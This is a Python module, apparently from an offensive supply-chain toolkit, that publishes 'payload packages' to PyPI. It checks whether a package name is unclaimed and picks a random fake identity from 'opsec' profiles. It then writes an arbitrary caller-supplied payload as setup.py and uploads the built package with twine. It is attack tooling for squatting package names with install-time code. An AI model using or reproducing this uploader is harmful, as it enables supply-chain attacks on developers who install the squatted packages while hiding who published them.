"""Publish PyPI payload packages."""
from __future__ import annotations

import asyncio
import random
import shutil
from typing import Optional

from core.logger import get_logger
from modules.pypi.scanner import Scanner
from opsec import load_profiles
from utils.fs_utils import temporary_directory

log = get_logger(__name__)


async def publish(name: str, payload: str, repository: str = "https://upload.pypi.org/legacy/", dry_run: bool = True) -> None:
    """Publish a Python package using ``twine`` if unclaimed."""

    scanner = Scanner(["https://pypi.org/pypi/{name}/json"])  # direct check
    if not await scanner.is_unclaimed(name):
        log.info("Package %s already exists", name)
        return

    profile = random.choice(load_profiles()) if load_profiles() else {"name": "test", "email": "test@example.com"}
    log.info("Using identity %s <%s>", profile.get("name"), profile.get("email"))

    if dry_run or not shutil.which("twine"):
        log.info("[dry-run] would upload %s to %s", name, repository)
        return

    with temporary_directory("pypi") as tmp:
        (tmp / "setup.py").write_text(payload)
        proc = await asyncio.create_subprocess_exec(
            "python",
            "setup.py",
            "sdist",
            cwd=str(tmp),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await proc.communicate()
        proc2 = await asyncio.create_subprocess_exec(
            "twine",
            "upload",
            "--repository-url",
            repository,
            "dist/*",
            cwd=str(tmp),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        _, err = await proc2.communicate()
        if proc2.returncode == 0:
            log.info("Uploaded %s", name)
        else:
            log.error("twine upload failed: %s", err.decode().strip())
